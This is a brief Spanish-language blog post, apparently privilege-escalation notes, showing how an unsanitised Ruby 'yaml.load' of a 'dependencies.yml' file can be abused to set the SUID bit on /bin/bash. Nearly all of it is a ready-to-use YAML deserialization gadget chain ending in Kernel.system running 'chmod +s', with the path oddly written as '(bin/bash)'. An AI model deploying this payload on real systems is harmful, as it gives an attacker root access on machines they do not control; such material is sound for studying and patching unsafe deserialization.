---
layout: post
tag: tags
---

# Forma de otorgar privilegio *SUID* **/bin/bash** -> aprovechando **'yaml.load'** en un script *'.rb'* que no esta sanitizado.
### En este caso este script esta en un archivo ***'dependencies.yml'*** al que apunta yaml.load para leer su interior y ejecutarlo.

* Script en ruby

```ruby

- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
        socket: &1 !ruby/object:Gem::Request
          sets: !ruby/object:Net::WriteAdapter
              socket: !ruby/module 'Kernel'
              method_id: :system
          git_set: "chmod +s (bin/bash)"
        method_id: :resolve
```
